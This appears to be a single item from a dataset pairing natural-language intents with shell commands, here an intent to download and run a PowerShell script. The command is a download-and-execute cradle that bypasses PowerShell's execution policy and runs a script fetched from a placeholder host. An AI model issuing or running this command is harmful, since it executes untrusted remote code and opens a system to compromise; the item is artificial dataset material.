# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://server.com/System.ps1')"
